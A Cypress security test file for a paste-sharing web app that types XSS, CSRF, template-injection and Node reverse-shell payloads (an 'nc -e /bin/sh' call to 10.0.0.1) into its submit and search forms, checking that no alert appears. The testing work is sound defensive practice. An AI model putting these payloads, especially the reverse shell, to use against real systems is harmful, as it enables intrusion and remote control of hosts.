describe('Tests Security', function () {
    it('Tests Submit Page for XSS', function () {
        cy.visit('http://localhost:4200/submitpage')

        // Fill out the title of the paste
        cy.get('#mat-input-0').type('XSS Injection Test')

        // Fill out the body of the paste
        cy.get('#richtexteditor_1007234207_0').type('<xss onafterscriptexecute=alert(1)><script>1</script>')

        // Fill out the date of the paste
        cy.get('#mat-input-1').type('2022-04-01T08:30')

        // Select paste type
        cy.get('#mat-select-0').click()
        cy.contains('Public').click()

        // Submit paste
        cy.get('#submitButton').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Home Page for XSS', function () {
        cy.visit('http://localhost:4200')

        cy.get('#searchbar').type('<xss onafterscriptexecute=alert(1)><script>1</script>')
        cy.get('#searchbarsubmit').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Submit Page for CSRF', function () {
        cy.visit('http://localhost:4200/submitpage')

        // Fill out the title of the paste
        cy.get('#mat-input-0').type('CSRF Test')

        // Fill out the body of the paste
        cy.get('#richtexteditor_1007234207_0').type('<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>')

        // Fill out the date of the paste
        cy.get('#mat-input-1').type('2022-04-01T08:30')

        // Select paste type
        cy.get('#mat-select-0').click()
        cy.contains('Public').click()

        // Submit paste
        cy.get('#submitButton').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Home Page for CSRF', function () {
        cy.visit('http://localhost:4200')

        cy.get('#searchbar').type('<img src="http://www.example.com/api/setusername?username=CSRFd">')
        cy.get('#searchbarsubmit').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Submit Page for Template Injection', function () {
        cy.visit('http://localhost:4200/submitpage')

        // Fill out the title of the paste
        cy.get('#mat-input-0').type('Template Injection Test')

        // Fill out the body of the paste
        cy.get('#richtexteditor_1007234207_0').type('${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}', {parseSpecialCharSequences: false})

        // Fill out the date of the paste
        cy.get('#mat-input-1').type('2022-04-01T08:30')

        // Select paste type
        cy.get('#mat-select-0').click()
        cy.contains('Public').click()

        // Submit paste
        cy.get('#submitButton').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Home Page for Template Injection', function () {
        cy.visit('http://localhost:4200')

        cy.get('#searchbar').type('#{1+1}', {parseSpecialCharSequences: false})
        cy.get('#searchbarsubmit').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Submit Page for Reverse Shell', function () {
        cy.visit('http://localhost:4200/submitpage')

        // Fill out the title of the paste
        cy.get('#mat-input-0').type('Reverse Shell Test')

        // Fill out the body of the paste
        cy.get('#richtexteditor_1007234207_0').type('require(\'child_process\').exec(\'nc -e /bin/sh 10.0.0.1 4242\'\)')

        // Fill out the date of the paste
        cy.get('#mat-input-1').type('2022-04-01T08:30')

        // Select paste type
        cy.get('#mat-select-0').click()
        cy.contains('Public').click()

        // Submit paste
        cy.get('#submitButton').click()

        cy.get('[name="alert"]').should("not.exist")
    })

    it('Tests Home Page for Reverse Shell', function () {
        cy.visit('http://localhost:4200')

        cy.get('#searchbar').type('require(\'child_process\').exec(\'nc -e /bin/sh 10.0.0.1 4242\'\)')
        cy.get('#searchbarsubmit').click()
    })
})